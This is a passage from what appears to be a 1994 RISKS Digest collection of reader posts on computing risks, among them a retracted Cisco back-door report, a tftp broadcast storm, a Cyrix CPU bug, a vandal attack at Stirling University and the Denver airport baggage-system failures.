because of short-term competitive pressures.  In this case, many companies are
able to reduce overhead and thus cut costs by drastically reducing the number
of suppliers they deal with, and growing economies of scale in some kinds of
hardware manufacturing may lead to worrisome concentration as well.

The same WSJ (page B1) reports that Steven Spielberg's production company
chose the Thinking Machines CM-5 for "Jurassic Park" (in which, of course, 
it ran some poorly designed software) because it "looked the least like a
science-fiction machine".  Wow.

The Canberra Times
                           CORRECTION

For some considerable time, *The Canberra Times* has been publishing the wrong
tide times for Narooma.  The error has been in arithmetical calculation in
this office of the difference between tide times at Fort Denison as published
in standard tide tables and times at Narooma.  The error, the source of which
is lost in antiquity, was discovered last week when the editor, relying on The
Canberra Times figures, was swept out to sea.  But he managed to return to
shore - and ordered this correction.

While clearing out my file cabinet, I uncovered the following, which struck me
as relevant to a lot of what goes on in comp.risks.  Quoted from a paper, 'The
Emperor's Old Clothes', by Charles Antony Richard Hoare, published in CACM Feb
1981:

    ...there are two ways of constructing a software design:  One way
    is to make it so simple that there are _obviously_ no deficiencies
    and the other way is to make it so complicated that there are no
    _obvious_ deficiencies.

    The first method is far more difficult.  It demands the same skill,
    devotion, insight, and even inspiration as the discovery of the
    simple physical laws which underlie the complex phenomena of
    nature.  It also requires a willingness to accept objectives which
    are limited by physical, logical, and technological constraints,
    and to accept a compromise when conflicting objectives cannot be
    met.  No committee will ever do this until it is too late.

(The paper was the 1980 ACM Turing Award Lecture.  The _'s represent his
italics.)

I just spoke to Al, and found out what the story was.  We hired a
subcontractor and part of his deal with us is that we provide them access to
the Internet through cisco's corporate network.  Since we have a relationship
and our networks are physically tied together, the routers are specifically
configured to allow greater access between our site and theirs (at their
request).

There was absolutely positively no "back door."  Al never actually performed
any tests with routers where he knew the configuration, and I would toss the
entire thing up to some miscommunication.

After consulting with Cisco, they have convinced me that the phenomenon I
reported earlier in <A HREF="/Risks/14.87.html">RISKS-14.87</A> was not a back door but was instead a unique
situation to a particular company's equipment caused by an unrelated
management issue.  The explanation seems reasonable, and I am willing to
assume that the supposed back door does not exist at this point, especially
since several independent groups have not been able to confirm its existence.
Those with Cisco routers can presumably relax, at least as far as this issue
is concerned.

I was in a local "Video Esprit" 24-hour video rental store here in Montreal
and I noticed a new service they have added for their customers.  There is a
PC in the store that, among other things, allows you to review your own
"rental history".  To access your records you just type in the last several
digits from your membership card.

Since the issue of privacy of video rental histories has had much discussion,
I thought RISK readers might be interested to know just how *easy* it has
become to get a list someone else's video rentals.  Just a glance at their
membership card is all it takes.

A couple of telephone-related questions popped up in the digest, and while
they might more properly be answered over on TELECOM, here are a couple of
answers anyway:

1) Dial 1 first.  This is becoming universal in North America to
   provide a sure way to distinguish between areas codes and prefixes.
   The network can only provide you with a recording that tells you
   that you need to dial 1 so long as no duplicate codes exist that
   will interfere with parsing of a particular call.  Many metro
   areas for years have been assigning prefixes that duplicate area
   codes.  Without 1+ dialing, the only way to differentiate would be
   by counting digits and providing long timeouts at the end of dialing
   all calls to determine when no more digits will be forthcoming.

   Starting around 1995, when the conventional area codes (second digit
   0 or 1) run out, new area codes will be assigned that look like
   prefixes.  The potential problems that may result in some phone
   systems, PBXs, etc. are quite nasty due to programmed (and in some
   cases hardwired) limitations in number parsing.

   The days when dialing 1 meant "toll call" are long since past in 
   most areas, and will be gone everywhere quite soon.

2) It has long been understood that using the same code (e.g. *67) for
   both blocking *and* unblocking of calling number ID is a bad
   idea.  Bellcore originally assigned the single code, and various
   telcos have argued before state commissions that there are various
   technical reasons why they couldn't have separate codes with existing
   switch software (generics).  However, my understanding is that most
   of the major switch generics are in the process of being updated 
   to allow this, and then those "technical" arguments will presumably
   no longer hold much sway in the discussion.

   The issue of calling number delivery via ANI (e.g. 800 numbers)
   is a complex one.  It can be argued that calling an 800 number is
   like making a collect call--the party you're calling is paying 
   for the call, and they need to know who is using their resources
   (either correctly or abusively) and where their money is going.

Both of these issues are probably better followed-up over in TELECOM
or other telecommunications-specific forums.

Is discussing risks RISKY?  I would like to see more discussion of this topic
-- even though it's been discussed in years past.  I agree completely with
PGN, who suggests that many people (I'd argue the majority) are living with
blinders on.  Even those on the provider/vendor side who should understand
the risks of certain technologies (cellular phones being an obvious
example), have a) underrated the intelligence of potential adversaries,
b) overestimated the cleverness of their own technology, c) underestimated
the speed at which exploitation information and devices would be
disseminated, d) assumed that the using public can't be hurt by what they
don't know, and e) let the magnitude of the financial rewards overshadow
everything.  Perhaps, more open discussion -- and knowledge that such
discussion -was- going to happen -- would encourage providers not to
make naive assumptions regarding the risks and might cause users to demand
more of the products they buy.  (Where have we heard that before?)

Anyway -- one approach to the problem has developed over the last few years
(since the Internet worm incident, to be more precise) that might be worth
noting.  A voluntary cooperative group of security incident response teams
known as FIRST (Forum of Incident Response and Security Teams) has developed
to address the problem of sharing potentially risky information without
giving away the store in the process.  Member teams include response teams
representing a wide range of "constituencies", including the Internet (i.e.,
CERT), various government agencies (e.g., DISA/ASSIST for DoD, Dept of
Energy's CIAC, CCTA for the UK, SurfNET in the Netherlands, etc.),
private sector organizations, vendors, and academia.  Member teams share
information on both latent and active system vulnerabilities through a
series of alerts issued by the various teams.  The alerts attempt to walk
the fine line of describing a problem in sufficient detail (along with
corrective actions) without providing enough information for exploitation.
 By initially distributing alerts only among member teams (and careful
vetting of members), there is reasonable control over distribution.

This certainly has not solved the problems associated with identifying and
closing system or network risks, it has made, I believe, great strides toward
building trust and mutual support through effective information sharing and
cooperation.  Other groups have use a similar approach to address similar
problems -- e.g., the sharing of virus information. I would be quite
interested to hear how others have addressed the problem.

&gt; Apparently the tank pressurization system on the Observer was tested
&gt; exactly once, and it "blew up." Whether this phrase is meant to imply
&gt; an explosion or merely a bad leak is an exercise left to the reader.

This is hardly a suspicious occurrence.  Testing of a new pressure vessel
design always includes, as a matter of standard practice, testing to 
failure.  This testing is required to ensure that the burst pressure is
where analysis indicated and that it is far enough removed from the 
operating pressure.

What would have been suspicious is if this test had NOT been performed.

  [It is my understand that standard procedure is to limit-test the FIRST
  tank to see how far it can be stressed, that is, stressed to the point
  at which it actually blows.  That is clearly not a test one wishes to 
  do on many tanks.  It also tells you nothing about other tanks.  PGN]

</i><PRE>

A major power outage here on Tuesday demonstrated the risks of 
excessive automation and administrative convenience.

Our computing environment consists of a heterogeneous network of
Sun, Dec and IBM workstations and related fileservers.
When a Sun workstation boots up, a hardware prom issues a rarp request 
to establish the workstations network address and to identify a server 
that can provide it with a bootprogram and then the Unix kernel.
The boot prom uses the trivial file transfer protocol (tftp)
to request the boot program.  It initially issues a tftp request
to the server it has identified, but if that tftp request times 
out then it broadcasts a tftp request on its local network
looking for any server that can provide it with a bootprogram.
It keeps repeating this process until it receives a boot program.
One the Suns the prom has no builtin knowledge of its network address 
or the network address of the server.  
There are some good reasons for keeping the boot prom ignorant of
its network environment and using a broadcast protocol, including 
the administrative convenience of not having to do anything to 
workstations when the server changes and providing a degree of robustness 
in a multi-server environment.

In recent years there have been security problems related to the
tftp protocol so in our environment the Dec workstations run security 
monitoring software that keeps a log of failed tftp attempts to help 
detect potential intruders.  The security software writes a log file
of failed tftp requests and also puts a message on the affected
machines console.

What got us into trouble after the power outage was that the Sun workstations
came back online but the corresponding Sun servers came up in a wedged 
state in which they responded to the initial rarp request but then failed
to respond to any workstations tftp request for a boot program.
After the initial tftp request to the Sun server timed out, our network 
was flooded with tftp requests from many Sun workstations all trying to
find any server that could boot them.

In the meantime the Dec workstations on the network had rebooted
successfully and were being used by a number of professors and students.
However, these machines soon became unusable due to the effort required
to deal with the flood of tftp requests.  The security monitoring
software contributed to this problem by writing messages to each 
machines console window (ignorable but consumptive of resources) and
by almost filling up a critical file system with its log files.
If this filesystem had filled up, the machines would have been totally
unusable.  Even if we hadn't been running the security monitoring
software, usability of these workstations would have been impaired
by the handling of the tftp requests.

There are several things that could have been done better:
- the question of whether falling back to a broadcast protocol for  
  booting is the right approach should be reexamined.  On most systems  
  the set of servers that could successfully respond to a boot request is
  a) small, b) well-known, and c) changes very slowly over time.
- the boot proms should use some form of backoff strategy when
  the tftp  requests consistently fail to avoid overloading the 
  network.
- our security logging software needs to be more robust in dealing
  with its log files.  Waiting until a log file write fails due
  to a full filesystem is too late if the full file system will
  cause other processes to crash.  This is tricky since we
  don't want a introduce a mechanism that would allow an intruder 
  to overwhelm the security software with failed attempts and then 
  proceed to do dirty work once logging has been suspended due to log
  file overflow.

A curious legal question comes to mind:  could the manufacturer
or the proprietor of the workstation containing boot prom be held 
guilty of a "denial of service attack" on our Dec workstations?  
If an individual had issued all of those tftp requests we certainly 
would be considering the question.

I'm an editor at Windows Magazine.  In our May issue I wrote a news
story reporting a bug in the Cyrix Cx486DX CPU.  The Cyrix Cx486DX was
designed to be completely software-compatible with Intel's i486DX
processor.  However, Ed Curry of Lone Star Evaluation Labs (LSEL) found
a bug relating to floating-point operations while doing some in-depth
compatibility testing.  Cyrix shipped thousands of chips with this bug
before April 1994, but has now fixed the problem.

The bug occurs when a register load instruction (such as MOV reg,mem)
is followed by an instruction that clears the floating-point status
register (FCLEX).  If the memory location being referenced is in the
CPU's internal cache, the MOV instruction works fine.  If, however, the
MOV requires an external bus cycle, executing the FCLEX instruction
aborts the cycle.  As a result, the register is not loaded properly.

The risk here is that someone may run software on the Cx486DX
that generates incorrect results where an i486DX would work fine.
The Cyrix position is that this is a minor bug and that we (Windows
Magazine and LSEL) are making too much of it.  However, LSEL has seen
the bug in their test code compiled under OS/2 and Windows NT.  The
test code performs typical engineering and scientific calculations, so
it's not contrived or artificial.  We have not found the problem in
any shrink-wrapped application.  Most MS-DOS and Microsoft Windows
insert a FWAIT instruction before any floating-point instruction, so
they generally won't exhibit the problem. 

What does the Risks readership think? Are we making too much of this?
Is anyone out there using PC with a Cx486DX?

I accepted a no-installation-cost trial of Caller ID and found
it somewhat useful for correlating call times with answering machine
messages, but found 90% of my received calls were out of my area
and thus had no number actually displayed, only the date and time.

Last night I noticed that the box had cleared out its memory.
No call had been received on that line between the time I had last
checked it and the time I noticed it with an empty list.

The risk here is that if some message was sent to the box through
the phone line to clear its list, then the box would be less useful
for someone using the box to catch a crank caller or even log
when important calls or messages were received.  If the caller
ID protocol includes such a message, then such a message could
undoubtedly be faked if someone got physical access to a residence's

I'm sure that boxes more advanced than the promotional box that
was given to me might have precautions or a printed log, but I would
imagine that the promotional boxes are widely used.

The voicemail system I use allows incoming FAXs to be saved and handled as 
messages. Upon receipt, the system notifies the user that there is an 
incoming fax message, and you can even query for the number of pages. 
When a message exists in the "voice mailbox", one can have the system 
forward it to a real FAX machine (either a preselected "primary" FAX or 
any other phone number.) Requesting such a forward places the FAX message 
into a queue, meaning it may actually be sent at some future time.

Last week I received a 5-page FAX message. It did not come from a local 
caller (one on the same telephone switch.) All I knew was that it was 
five pages. I sent it off to my primary printer, and an hour or so later 
went to pick it up. No FAX for me there. I tried again. No FAX for me. 
FAX machine broken? After a day of this, I sent the FAX to a machine and 
promptly went to watch. Out came a list of imported tequila prices, and 
several blank pages! I recalled seeing several such lists at the other 
FAX machines...But none were addressed to me! Surely they weren't 
mine...but a closer inspection showed that the FAX phone number listed 
was indeed mine (perhaps a missing area code?)

Whoa! that kind of business is illegal here! And I've been spreading the 
things around the area. At least I didn't have my name on them, but the 
phone number was mine!

Welcome to the wonderful world of hi-tech. It used to be that FAX 
machines were relatively rare, and "dialing" a wrong number would mean 
the FAX doesn't get sent. Now, EVERY phone here can receive a FAX, and we 
can send multiple copies out without knowing what it is we sent! Yes, 
I'll be a bit more careful in the future.

   appended a "You mean a FAX PAS?  PGN" appendum.  THANKS!  PGN]

The memo Jerry Leichter posted was an actual Silicon Graphics memo.
However, life for Silicon Graphics and Tom Davis is not quite so bleak
as some might think. Tom Davis wrote the original memo to point out
problems and ask everyone to help fix them.

It was very effective. I installed a beta version of the new 5.2 release on my
Indy in January, and only rebooted the machine a couple of weeks ago because I
was moving to another building. Sure, I had to add another swap file
on-the-fly about once a month because my emacs processes grew so large :-),
but the system did not crash. And performance is quite snappy. "Watch the
skies."

Since the memo has been popping up all over the net, Tom has written a reply
to it, included below. There isn't really a RISKS tie-in, unless you count the
risk of having only the "bad" half of a story get wide distribution.

I am the author of the original memo below, which was intended for
internal Silicon Graphics use only, and was not for anyone outside the
company.  But since it has been leaked to the net, and is beginning to
be used by competitor's sales people, I feel a response is required.

I don't believe that these problems are unique to Silicon Graphics.
&gt;From discussions with friends who are insiders in many different
companies, I am certain that similar memos could be written about the
software of each of our competitors.

What I like about working for Silicon Graphics is that at least here,
something is being done about it -- I worked for companies in the past
where the response would have been to stick our heads in the sand in
hopes that the problems would just fix themselves.  If I hadn't thought
that the memo would catalyze some change here, I wouldn't have written
it.

The details appear as comments to my original article below.  Luckily,
the article is 6 months old, and we have had a chance to make some
significant progress.

Typically, what happens is that each faster generation of hardware is
followed by software that more than compensates for the increased
speed, but as a result of this memo, Silicon Graphics has been able to
skip one of the slowing software cycles, making, instead, a performance
and quality based release.  The next release is going to be similar,
and in the meantime, we get an extra hardware boost from the faster
R4600 processors.

General comments:

As a fairly direct result of this memo, SGI decided not to continue
"business as usual" in software development.  The approach we took to
the problem was the following:

With the 4.0.5abcdefghi... fiasco, and the fact that the 5.* releases
were still for specific machines, our developers were desperate for an
all-platforms release.  We decided to make such a release relatively
soon -- and 5.2 actually MRed in February.  The 5.2 release had two
goals -- primarily, all-platform, and given that it went out in
February, do as much performance-tuning and bug-fixing as time allowed.

In that period, the performance on 16MB systems was essentially doubled,
which improved performance on larger systems as well, but to a lesser
degree.  Significant numbers of bugs were fixed as well.

Some people hoped that a few quick fixes would bring back all the
performance in 5.2, but a little investigation indicated that was a
list of things to be done, and that another quality release would be
required.

The 5.3 release, not officially scheduled, but which should be MRed
around October or November is that quality (performance and bug-fix)
release.  We'll add a few new features, but they will be the exception
rather than the rule.  The longer time before the 5.3 release should
give us time to do a thorough job of solving our problems.

For 5.3, there's also time to set up solid performance and bug-fixing
goals, and these are already being discussed.

And most important -- the worst problems were with 16 MB systems that
paged their brains out.  They are better now, but not great.  But we
don't sell them.  One of the 5.3 goals is to improve performance (or
reduce sizes enough) that it will be acceptable on a 16 MB machine.

The kernel memory leaks are all fixed, and many of the important
programs have been reduced in size.  For 5.2, 5 or 6 of our most
heavily-used programs were subjected to close scrutiny to find out where
the performance went, and many were significantly improved.

A lot more work is planned for 5.3 to reduce the sizes of the
executables.

Work is continuing on the DSOs to split them up properly so that they
don't all have to be loaded, and to improve their performance and
start-up time.  We're working to make "quick-starting" happen more
automatically.

&gt;     PERFORMANCE UPDATE

I don't think it's unusual to do benchmarks with non-standard compiler
settings.  Both we and our competition have done so for a long time.  We
do ship all the libraries, et cetera, necessary to duplicate these
results so customers for whom speed is the only objective can pay the
cost of larger executables in exchange for the added speed.

Unfortunately, I can't re-run some of these tests, but 5.2 is definitely
better than 5.1.


I think the 5.1 fiasco has caused a lot of our management to see the
light, and in conversations with people at all levels, it's clear that
nobody wants to see anything like it happen again.  The 5.2 and future
5.3 releases seem to be steps in the right direction.

But there's still a lot of work to do, and we in engineering can use
every minute between now and the 5.3 release to improve things.

The 5.3 release is being planned with reasonable beta-cycles, and with
enough time between now and "code freeze" to make significant
improvements.

&gt; Management Issues:

I think this sort of disconnect is not too unusual -- there is always
enormous pressure to announce a very low entry price-point, and the
16MB system provided that.  Everybody does this with the full knowledge
that on a minimum system, you won't be able to run many interesting
applications, and almost everyone will have to purchase a bit more
memory.  It's just that in the case of Indy, there were so many new
features that the proposed minimal system was embarrassingly slow.

The "fix" is simply not to ship the 16MB systems which will insure that
everyone will get a very usable machine.  All we really lose is our low
entry price point, and the gain is that we won't have to deal with the
few irate customers who bought a minimal system.

Although some of our performance loss is due to more complicated
features, the vast majority is due to the fact that more memory is
required, and without it, the systems page with a consequent dramatic
reduction in performance.  The 4.0.X -&gt; 5.X change on our large machines
was measurable, but not nearly so noticeable as on the smaller ones.


We're still not completely there (as far as I can tell) with respect to
better software management.  The good thing is that many of our
higher-level managers are acutely aware of the problem now -- Forest
Baskett and Tom Jermoluk are extremely concerned, for example.

It's too bad it took a shock like 5.1 to make everybody take notice, but
at least they did, and we're doing the right sorts of things to correct it.

For years, people have been postulating projects that are too complicated to
comprehend and we have seen several examples of what happens when this occurs.
IMHO the only solution is to separate functions into stand-alones that utilize
a common and understandable foundation and which are understandable.

Where many have felt that a single integrated system is best, I have often
been called in to "put out fires" and the first thing I do is to separate the
problem into "atoms", the least divisible pieces. It is astounding how often
problems that cannot be seen when tightly wrapped in a package becomes obvious
when viewed by itself. Sometimes you just can't see the tree for the forest.

&gt; Some people claim that we need new software debugging tools to look at
&gt; the problem, and that may be true, but it's not a short-term solution,
&gt; and it runs the risk of causing us to spend all our time designing
&gt; performance measurement tools, rather than fixing performance.

This is disturbing. Unless you have the tools to properly examine a system you
cannot tell what is really going on and the reccuring theme of the memo seems
to be that no-one knows. Without the proper tools, the job will never be
completed.

Again I can only speak from personal experience but cannot count the times 
when called in to fix a problem that supervisors have gotten very antsy 
waiting for something to happen while the envelope is being defined. Have
found that unless the system is understood, it *can't* be fixed (see "little
silver hammer" syndrome).

The problem with the engineers also appears symptomatic. Engineers are
supremely good at taking a concept and making it work. They are not generally
good at determining that a concept is flawed in the first place, instead often
they will continue to work as if the concept were correct and they were just
lacking in skill. This leads to precisely the morale problems described.

The major problem with engineers is that they accomplish the impossible
so often that the marketeers come to expect it from them.

The real problem seems to be simply "no-one in charge" and is all too common
in large organizations. History is rife with examples of companies, states,
countries that became too concentrated at the top and fell victim to the
huns/vandals/Standard Oil as they rose to power. "Think of it as Evolution in
Action" - Jerry Pournelle

  Inspecting Critical Software: An Intensive 3-day Course offered by
  The Faculty of Engineering, McMaster University, Hamilton, Ontario, Canada 
     
  Taught by Prof. David Lorge Parnas, with the support of TRIO
     
  June 7, 8, 9, 1994
     
1.  Background

    Software is critical to the operation of modern companies and is
frequently a key component of modern products.  Some pieces of software
are particularly critical; if they are not correct, the system will have
serious failures.  Standard methods of software inspection are not
systematic. This course teaches a procedure for software inspection that
is based on a sound mathematical model and can be carried out
systematically by large groups.
    The software inspection procedure combines methods used at IBM, work
originally done at the U.S. Naval Reserve Laboratory for the A-7E
aircraft, and procedures applied to the inspection of software at the
Darlington Nuclear Power Generating Station.  The method has been refined
and enhanced by the Software Engineering Research Group at McMaster
University's Communication Research Laboratory.  It can be applied to
software written in any imperative programming language.

2.  What Will Participants Learn?

    Participants in the course should return to their workplace with an
understanding of the way that mathematics can be used to document and
analyze programs.  They will also return with documentation of a piece of
their employer's code that can be used to explain the work to others.

3.  Programme

Day 1  Predicate Logic and Program-Functions/Relations

1)  Overview and Case Study
    A discussion of previous applications of the method.
2)  Predicate Logic
    The inspection method is based on predicate logic, which will be
    reviewed in this section.
3)  Tabular Expressions
    This session will be devoted to the writing of readable
    predicates using two-dimensional notations rather than classical
    one-dimensional expressions.  There will be numerous examples. 
    Participants will be taught to read and write tabular expressions.
4)  Describing Program Function
    This session will be devoted to writing program descriptions
    using predicates and tables.

Day 2  Inspection of Dijkstra's Dutch National Flag Program

    Participants will be given a copy of E.W. Dijkstra's explanation of a
program along with several sample programs.  They will be asked to apply
the inspection method and approve or reject each program.  The instructor
and some assistants will be available as consultants during this process.

Day 3  Morning:  Inspection of a "Real" Program

    Working in small groups, the participants will take a section of a
program from their company and inspect it using the method learned so
far, producing documentation as they go.  Day 3 Afternoon: Report on the
Inspection Results, Discussion of Testing
    The first part of the afternoon will be devoted to a series of
reports by the participants on the results of their efforts in the
morning.  The remainder of the afternoon will be devoted to a discussion
of the interaction between testing and inspection.  We treat testing, not
as an alternative to inspection, but as complementary to inspection.  We
discuss the way that the documentation produced in the inspection process
can be used in the testing process.

4.  Learning By Doing

    The course is language-independent.  In fact, on the third day,
participants will inspect code written in any language that they use in
the workplace.  This course presents an approach to active design reviews
that has the reviewers writing precise documentation about the program
and explaining their documentation to an audience of other reviewers.  A
significant part of each day will be spent using the ideas that have been
presented to determine whether or not programs do what they are supposed
to do.  On the last day, participants will inspect a small program that
they brought with them from their company.  Participants should leave the
course with improved ability to inspect software.

5.  Who Should Attend?

    Participants should be experienced programmers and not afraid of
learning a little mathematics.  The mathematical basis for the method is
classical and takes up only a few hours in the course.  However, it is
fundamental to understanding the method.  It is expected that the
participants will be used to reading code written by others and it will
be helpful if they can read Pascal.

6.  What Should You Bring With You?

    For the exercise on the third day, each participant should bring a
small program, perhaps 50 lines that are critical to some project.  It
need not be "mature" code, but it should compile and have survived some
testing or use.  If there are several participants from the same company,
they may work in small groups on slightly larger programs.  You may want
to bring a reference manual and some conventional documentation about the
program with you.  It will help if one of the participants is familiar
with the program.

7.  The Instructor

    The course will be taught by Prof. David L. Parnas, an
internationally recognized expert on Software Engineering.  Dr.  Parnas
initiated and led the U.S. Navy's Software Cost Reduction Project, where
the tabular notation was first used, advised the AECB on the use of these
methods at Darlington, worked with IBM's Federal Systems Division, leads
the Software Engineering Research Group at McMaster University and is a
Project Leader for the Telecommunications Research Institute of Ontario.

Early on Monday 18th April, a vandal exploiting a not-unknown security hole
started disrupting services and corrupting files at Stirling University in the
UK. Stirling University is a SuperJanet site, with a microwave link to
Edinburgh. The entire site was affected. I was working intensively with a
colleague in Stirling at the time. My experience was that the site was
unreachable by Internet services for over 24 hours, and that telnet and ftp
services were seriously degraded for 3-5 days. Email service was unavailable
for 2-3 days. It would be conservative to estimate that at least 6
person-weeks of expert time were required to discover and repair the damage. I
cannot assess the amount of disruption, not only in terms of work time lost
but in terms of reorganising one's planned work time, to users of the systems.
It must be considerable, if my experience is any guide.

Someone believed to be the vandal, and a member of the University, was
identified I believe on Tuesday 19th. I understand he is no longer on
University premises, and the University authorities are considering what
further action is required. Because of possible legal proceedings, I'll
identify my sources of information and exactly what they said in an Appendix.

In a separate submission, I'll offer a few comments of my own on this
incident.  I had been a member of the Stirling Department of Computer Science
and Mathematics for 18 months up until April 94. Knowing that it was an
`inside job', I queried a colleague as to whether more than one member of the
department knew the suspect. The answer was yes.  &gt;From this information
alone, I was able to identify my own suspect X, and ask whether X was any
longer around, or whether anyone expected to see him back. The answer confirms
to me with high probability that X is the suspect. (I note that nothing has
been proved concerning X.)

If X did it, the process by which he came to it would be interesting, both for
psychologists and for those who wish to secure their systems against
corruption. [I'll drop the conditional and use the indicative, for stylistic
not semantic reasons. Readers should reinsert it, since nothing has been
proven against X.]  And it provides a cautionary tale that shows how
vulnerable we all are.  After the fact, I can guess who X is with a bare
minimum of hints.  However, before the act, only X's therapist, if he had one,
is likely to suspect that anything may happen. And of course, in any case if
he had been able to communicate his feelings to anyone sympathetic or
understanding - but otherwise uninvolved - the chances are that the incident
would not have happened. It's a very self-destructive act.  Playing with
computers is an important part of X's life, and indications are that he was
good at it and liked it.  Now, no one but no one is likely to offer him a job
doing it. A major part of his life is in ruins. Despite all else, I can feel
some sympathy for what must be his current plight. It isn't even zero-sum.
Everyone has lost in a big way. [And it must be far, far worse for him if he's
not the culprit!]

Peter Ladkin

Appendix: Sources of Information.

I talked to the Senior Computer Officer of the Department of Computing Science
and Mathematics by phone on Tuesday 19th. He confirmed that the Stirling site
was off the Internet on Monday, that disruption started early Monday morning,
luckily just after Computer Science had made backups of their subnetwork of
systems. He confirmed an estimate of at least 3 person-weeks of the DCSM
staff, and suggested at least an equal number for Computing Services staff, to
identify damage and effect some repair. He said that the disruption was caused
by someone exploiting a not-unknown system weakness, and that a suspect who
was a member of the University had been identified and removed from the site.
He identified the gender of the suspect by his choice of pronoun. He gave no
further information, citing administrative and legal responsibility.

I talked to one member of the Department of Computing Science and Mathematics,
who confirmed that a suspect was known to more than one member of the
Department, and that he (male) was identified through a piece of `luck'.

,In the 5/1/94 Sunday New York Times, the Business section includes one of
those nice experiential articles about new technology, in this case a Ford
with DSP circuitry in it that makes the inside of the car sound like a
cathedral (concert hall, night club, opera house, stadium, etc).  The full
reference is:

  Hans Fantel, A recital hall on wheels, New York Times, 1 May 1994,
  Business section page 7.

Here is a brief quotation:

  "Subjectively it's eerie.  Sitting inside this hologram, I felt bathed
   in music, virtually forgetting where I was.  Engine and traffic noises
   faded from awareness.  The car somehow seemed like a space capsule.
   I was gliding along, swathed in Puccini, while outside the harried
   scenes of Manhattan rolled by like a silent movie."

On the same page is another article about plans by the US government and
Rockwell International for "intelligent vehicle highway systems".

The April 24 edition of the Sacramento Bee (page B5, staff writer) publishes a
story about a miniature camera that will "revolutionize" the Sacramento area
security alarm industry.

Some important points of the article:

A miniature "camera on a chip," about the size of a postage stamp, is attached
to an alarm system.  When the alarm is tripped, the camera sends four pictures
back to the the alarm monitoring service.  Presumably, the pictures are
digitally encoded and sent through some sort of modem.

The first picture arrives twenty seconds after the alarm is tripped.

Police are particularly excited about this because it will let them use the
pictures to detect false alarms.

The system is intended to be used in a wide variety of businesses, and also
residencies.

The photographs will be usable as evidence in court against robbers
and burglars.

The camera is so small that it can be easily hidden anywhere.  It is also
inexpensive -- one third to one half the cost of a closed-circuit video
camera.

"The pictures come out pretty clear," according to a police
communications supervisor.

The device was developed by Automated Security Holdings in England,
licensed to TVX Inc. of Broomfield, Colorado, and test-marketed by
Roseville Telephone (near Sacramento).

.....

The risks?  Many.  Here are a few:

It only takes four pictures, which are presumably freeze-frames.  A burglar
may trip the alarm yet not be photographed (perhaps going by the camera
between pictures).  The alarm agency or police may see that the pictures don't
show anything, and thus believe that it is a false alarm.  They may then
decline to respond or may respond inappropriately.

This is a perfect spy device, and will be easily available at a price less
than a simple video camera.  The potential abuses of such a device are many,
but employee monitoring is one.  Your boss could point one at your work area
to watch you, and you'd never know.  A hidden security camera is really a spy
camera, equivalent to an audio bug.  In fact, the article mentions that it
could be used against internal thefts.

If someone says the pictures are "pretty" clear, that means that they aren't
entirely clear.  If police trust pictures too much, the potential is there for
police to misidentify a suspect (based on a picture), but firmly believe that
they are right.  This is especially likely if the pictures are monochrome.  As
the first picture arrives in twenty seconds, they are certainly low resolution
(consider connection time for the modems).

A camera in my residence?  What if it starts sending pictures back to the
alarm company at random?  What if some voyeur at the alarm company figures out
how to get pictures whenever he wants?  Most people who have these alarm
systems will not know how they work, so they won't be aware of these risks.

A remote digital camera would be useful in some situations.  For instance, it
could send pictures of a bank robber holding a gun, so that the police could
more easily identify a suspect.  The main risk here is (again) too much trust
in the technology.  Also, there's not a great need to hide a security camera.
You generally want potential crooks to know they're being monitored.

The Saturday, 30 April 1994 issue of the _Rocky Mountain News_ (and probably
every other paper within 500 miles) had a massive front page story on the
utter failure of the luggage system during tests at Pena International.  (IMHO
these design failures have reached the point where the current Secretary of
Transportation needs to answer some questions.)

Apparently, Mayor Webb is considering an *indefinite* delay, at the request of
the hub airlines United and Continental.

Of interest to comp.risks readers are the following paragraphs from the
article:

  Webb, who has regretted setting -- and missing -- other airport deadlines
  during his three years in office, said other one isn't a good idea.

  Although deadlines motivate some people, they don't work well
  for computer programmers who must fix what is wrong at DIA, he said.

Strictly speaking, this is probably true.  The incredible design flaws (e.g.,
designing the airport to use an untested luggage transportation system with
*no* fallback capability) and construction snafus (e.g., the "messy" power
system despite contractual agreements to provide a "clean" power feed, leading
to significant delays while BAE scrambled to find power filtering equipment)
leave software as the only practical way of getting out of this mess.

And very few experienced programmers would tolerate the same people who have
screwed up things to this extent trying to impose an unrealistic deadline on
them now...

... but Joan Q Public will undoubtably read this as yet another example of
computer software screwing up the system.  It's the 90's -- your dog didn't
eat your homework; the software garbled it!

It's almost enough for me to move 30 miles so I can vote against Webb in the
next election. :-)

Reading later articles (there were several pages of DIA coverage today, not
just Mayor Webb's flamebait), it appears the scapegoat du jour for the DIA
delay is the "buggy software" that reads the bar codes in the luggage and
determines where to send the cart.

A fascinating (for the wrong reasons) newspaper article included
such interesting factoids as:

  Software -- essentially the brains of a computer system -- is
  so complex that a misplaced comma or an omitted semicolon can
  crash entire computer systems.

  Even the smallest error can cause a ripple effect that turns
  into a tidal wave of the kind that swamped AT&amp;T's main switching
  system several years ago and shut down nearly 90% of the phone
  company's domestic long-distance operations for hours.

Strange how us computer types have never figured out how to check
for syntax errors like this.  (Compilers can't catch all such
errors, but that's why we set up human checks like coding standards
and code walkthroughs.)

  The BAE system employs laser scanners that read bar-coded labels
  placed on baggage.  Experts say that means the BAE computer system
  probably employs real-time, numerical-control software.

Hmm... doesn't "numerical control" refer to machining equipment?

   At Louisville-based Storage Technology Corp., such software is
   a key feature of the company's robotic tape library storage
   systems.

   "What they are probably seeing, and I saw it many times, is that
   you fix one problem and you're just peeling back a layer of the
   onion," said Mark Hopkins, an engineering manager for StorageTek.

Which explains why Iceberg has been such a successful product.

Strangely absent from the article is the reason Denver (or BAE)
decided to build a system which reads tags on luggage (which can
be oriented in an arbitrary direction) instead of reading permanent
tags on the cart itself.  The latter case would require keeping track
of what luggage is in which cart, but eliminates all of the headaches
of reading the tags on the luggage itself.  (Hmm, the wording of
a newspaper graphic implies that a copy of the luggage tag may
be placed on the cart as well, but its alignment may not be perfect.)

Even stranger was an item in another article which identified "gaps"
in the tracks as a biggest problem right now (the software being
a bigger long-term problem).  It seems the wheels on the cart are
falling into gaps between sections of track, causing jams or
derailments.  (Failing luggage is a serious construction worker
hazard.)

This is truly bizarre since the luggage system is in a protected environment,
located in underground tunnels.  For the tracks to be damaged by "vibration"
caused by a couple limited tests implies that this infrastructure was
*seriously* underdesigned.

  SACRAMENTO - The California Department of Motor Vehicles has informed a
  flabbergasted legislative committee that it has spent $44.3 million on a
  computer modernization program that will never work.
	...

Note that this amount of money is approximately equal to the $50M per year in
highway funding that the federal government has been withholding from
California because we have not yet instituted the rule that anyone caught in
possession of any amount of any illegal drugs or prescription drugs without a
prescription will have their driver's license suspended for six months.
That's whether you're driving at the time or not.  According to the SJ Mercury
News a week or two ago, the CA state legislature is most unlikely to put off
